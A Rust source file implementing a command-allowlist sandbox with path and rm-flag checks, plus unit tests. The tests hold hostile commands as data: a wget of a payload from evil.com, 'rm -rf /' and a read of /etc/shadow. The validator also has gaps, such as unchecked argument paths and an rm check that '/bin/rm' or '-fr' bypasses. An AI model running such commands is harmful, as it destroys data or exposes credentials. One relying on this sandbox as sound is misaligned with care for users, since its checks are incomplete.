use std::collections::HashSet;
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, PartialEq)]
pub enum SandboxError {
    ForbiddenCommand(String),
    PathTraversal(PathBuf),
    DangerousFlags,
}

impl std::fmt::Display for SandboxError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SandboxError::ForbiddenCommand(cmd) => write!(f, "Command '{cmd}' is not allowed"),
            SandboxError::PathTraversal(path) => write!(f, "Path traversal detected outside project root: {:?}", path),
            SandboxError::DangerousFlags => write!(f, "Destructive flags detected (e.g., rm -rf /)"),
        }
    }
}

#[derive(Debug)]
pub struct CommandSandbox {
    allowed_commands: HashSet<&'static str>,
    project_root: PathBuf,
}

impl CommandSandbox {
    pub fn new(project_root: PathBuf) -> Self {
        Self {
            allowed_commands: HashSet::from([
                "cargo", "git", "cat", "ls", "grep", "rg", "sed", "awk",
                "touch", "mkdir", "rm", "cp", "mv", "chmod", "echo",
                "pwd", "whoami", "date", "head", "tail", "find", "stat",
            ]),
            project_root,
        }
    }

    pub fn validate(&self, command: &str, args: &[String], cwd: Option<&PathBuf>) -> Result<(), SandboxError> {
        let cmd_name = Path::new(command).file_stem()
            .and_then(|s| s.to_str())
            .unwrap_or(command);

        if !self.allowed_commands.contains(cmd_name) {
            return Err(SandboxError::ForbiddenCommand(command.into()));
        }

        // Normalize paths safely; fall back gracefully on canonicalize errors
        let root_canon = std::fs::canonicalize(&self.project_root).unwrap_or(self.project_root.clone());
        let effective_cwd = cwd.cloned().unwrap_or_else(|| self.project_root.clone());
        let cwd_canon = std::fs::canonicalize(&effective_cwd).unwrap_or(effective_cwd);

        if !cwd_canon.starts_with(&root_canon) {
            return Err(SandboxError::PathTraversal(cwd_canon));
        }

        // Block dangerous flags for destructive commands
        if command == "rm" && (args.contains(&"-rf".into()) || args.contains(&"-r".into())) {
            return Err(SandboxError::DangerousFlags);
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_allow_command() {
        let sandbox = CommandSandbox::new("/tmp/test-project".into());
        assert!(sandbox.validate("cargo", &["build".to_string()], None).is_ok());
        assert!(sandbox.validate("git", &["status".to_string()], None).is_ok());
    }

    #[test]
    fn test_forbidden_command() {
        let sandbox = CommandSandbox::new("/tmp/test-project".into());
        assert_eq!(
            sandbox.validate("wget", &["http://evil.com/payload.sh".to_string()], None),
            Err(SandboxError::ForbiddenCommand("wget".into()))
        );
    }

    #[test]
    fn test_dangerous_flags() {
        let sandbox = CommandSandbox::new("/tmp/test-project".into());
        assert_eq!(
            sandbox.validate("rm", &["-rf".into(), "/".into()], None),
            Err(SandboxError::DangerousFlags)
        );
    }

    #[test]
    fn test_path_traversal() {
        // Simulates cwd outside root (canonicalize fails gracefully for this test)
        let sandbox = CommandSandbox::new("/tmp/test-project".into());
        assert!(sandbox.validate("cat", &["/etc/shadow".to_string()], Some(&PathBuf::from("/var/tmp"))).is_err());
    }
}
